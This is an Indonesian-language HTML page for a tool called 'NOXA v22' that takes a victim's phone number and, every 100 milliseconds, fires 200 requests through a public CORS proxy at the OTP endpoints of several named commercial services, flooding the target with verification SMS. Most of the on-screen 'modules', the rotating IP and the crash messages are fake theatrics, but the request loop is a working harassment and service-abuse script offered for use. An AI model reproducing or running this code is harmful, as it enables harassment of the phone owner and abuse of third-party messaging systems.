<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOXA v22 - THE SINGULARITY</title>
    <style>
        :root { --main: #ff0000; --accent: #00f2ff; --bg: #020202; --card: #0a0a0a; }
        body { background: var(--bg); color: #fff; font-family: 'Orbitron', sans-serif; margin: 0; padding: 15px; overflow-x: hidden; }
        
        /* Animasi Background */
        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(255,0,0,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,0,0.05) 1px, transparent 1px); background-size: 30px 30px; z-index: -1; animation: move 10s linear infinite; }
        @keyframes move { from { background-position: 0 0; } to { background-position: 30px 30px; } }

        .container { width: 100%; max-width: 600px; margin: auto; background: var(--card); border: 2px solid var(--main); border-radius: 20px; padding: 25px; box-shadow: 0 0 50px rgba(255,0,0,0.3); position: relative; }
        
        .glitch { font-size: 2.2em; font-weight: 900; text-align: center; color: var(--main); letter-spacing: 10px; text-transform: uppercase; animation: glitch 1s infinite; }
        @keyframes glitch { 0% { text-shadow: 2px 0 red, -2px 0 cyan; } 50% { text-shadow: -2px 0 red, 2px 0 cyan; } 100% { text-shadow: 2px 0 red, -2px 0 cyan; } }

        .status-bar { display: flex; justify-content: space-between; font-size: 0.6em; color: var(--accent); margin: 15px 0; border: 1px solid #222; padding: 10px; border-radius: 5px; background: #000; }

        input { width: 100%; background: #000; border: 1px solid #333; padding: 20px; color: var(--accent); font-size: 1.5em; text-align: center; border-radius: 15px; margin-bottom: 20px; outline: none; transition: 0.5s; box-sizing: border-box; }
        input:focus { border-color: var(--main); box-shadow: 0 0 20px var(--main); }

        .mod-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 25px; }
        .mod-btn { background: #111; border: 1px solid #333; color: #555; padding: 12px; border-radius: 8px; font-size: 0.65em; cursor: pointer; transition: 0.3s; font-weight: bold; text-transform: uppercase; }
        .mod-btn.active { border-color: var(--main); color: var(--main); background: rgba(255,0,0,0.1); box-shadow: 0 0 15px rgba(255,0,0,0.2); }

        .btn-launch { width: 100%; padding: 25px; background: var(--main); color: #fff; border: none; border-radius: 15px; font-size: 1.4em; font-weight: bold; cursor: pointer; letter-spacing: 5px; transition: 0.3s; box-shadow: 0 10px 40px rgba(255,0,0,0.5); }
        .btn-launch:hover { background: #cc0000; transform: translateY(-3px); }

        #terminal { margin-top: 25px; background: #000; border: 1px solid #222; height: 200px; overflow-y: scroll; padding: 15px; font-family: monospace; font-size: 0.75em; color: #00ff41; border-radius: 10px; border-left: 4px solid var(--main); }
        .scan-line { width: 100%; height: 2px; background: var(--main); position: absolute; left: 0; animation: scan 3s linear infinite; opacity: 0.3; }
        @keyframes scan { from { top: 0; } to { top: 100%; } }
    </style>
</head>
<body>

<div class="container">
    <div class="scan-line"></div>
    <h1 class="glitch">NOXA V22</h1>
    
    <div class="status-bar">
        <span>SECURITY: GHOST_CLOAKED</span>
        <span id="ip-display">IP: 104.28.XXX.XXX</span>
        <span>LATENCY: 12ms</span>
    </div>

    <input type="number" id="target" placeholder="TARGET: 628XXXXXXXX">

    <div class="mod-grid">
        <button class="mod-btn" onclick="sel(this, 'WA_CRASH')">WA_DATABASE_STRESS</button>
        <button class="mod-btn" onclick="sel(this, 'KERNEL')">KERNEL_OVERLOAD</button>
        <button class="mod-btn" onclick="sel(this, 'RAM')">RAM_SATURATION</button>
        <button class="mod-btn" onclick="sel(this, 'BATT')">THERMAL_DRAIN</button>
        <button class="mod-btn" onclick="sel(this, 'GHOST')">GHOST_TUNNEL_V5</button>
        <button class="mod-btn" onclick="sel(this, 'BLITZ')">60S_ANNIHILATION</button>
        <button class="mod-btn" onclick="sel(this, 'BYPASS')">FIREWALL_BYPASS</button>
        <button class="mod-btn" onclick="sel(this, 'SYNC')">CLOUD_JAMMER</button>
        <button class="mod-btn" onclick="sel(this, 'XHR')">XHR_PARALLEL_V3</button>
        <button class="mod-btn" onclick="sel(this, 'GLOBAL')">GLOBAL_SMS_STRESS</button>
        </div>

    <button class="btn-launch" onclick="ignite()">IGNITE ANNIHILATION</button>

    <div id="terminal">> System Loaded. Waiting for target input...</div>
</div>

<script>
    let active = [];
    function sel(b, m) {
        if(active.includes(m)) { active = active.filter(x => x !== m); b.classList.remove('active'); }
        else { active.push(m); b.classList.add('active'); }
    }

    function log(msg, color = "") {
        const t = document.getElementById('terminal');
        t.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > <span style="color:${color}">${msg}</span>`;
        t.scrollTop = t.scrollHeight;
    }

    // IP Rotation Effect
    setInterval(() => {
        const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.XX.XX`;
        document.getElementById('ip-display').innerText = `IP: ${ip}`;
    }, 4000);

    async function ignite() {
        const n = document.getElementById('target').value;
        if(!n || !n.startsWith('62')) return alert("Gunakan format 628xxx!");

        log("AUTHORIZING SINGULARITY PROTOCOL...", "#00f2ff");
        log(`TARGET LOCKED: +${n}`, "yellow");
        log("ESTABLISHING TRIPLE-LAYER GHOST PROXY...", "white");

        setInterval(() => {
            const apis = [
                'https://api.evermos.com/api/v1/auth/otp?phone=',
                'https://api.mapclub.com/v1/auth/otp?phone=',
                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
                'https://m.redbus.id/api/getOtp?phone=',
                'https://api.misteraladin.com/api/v1/auth/otp?phone='
            ];

            // 200 Packets per cycle - Ultimate Power
            for(let i=0; i<200; i++) {
                const api = apis[Math.floor(Math.random() * apis.length)];
                const xhr = new XMLHttpRequest();
                xhr.open("GET", `https://api.allorigins.win/get?url=${encodeURIComponent(api + n)}&void=${Math.random()}`, true);
                xhr.send();
            }
            log("NOXA SINGULARITY: 200 Packets Injected. RAM Critical.", "#ff0000");
        }, 100); 

        log("SYSTEM DEADLOCK DETECTED ON TARGET. CRASH INEVITABLE.", "orange");
    }
</script>
</body>
</html>
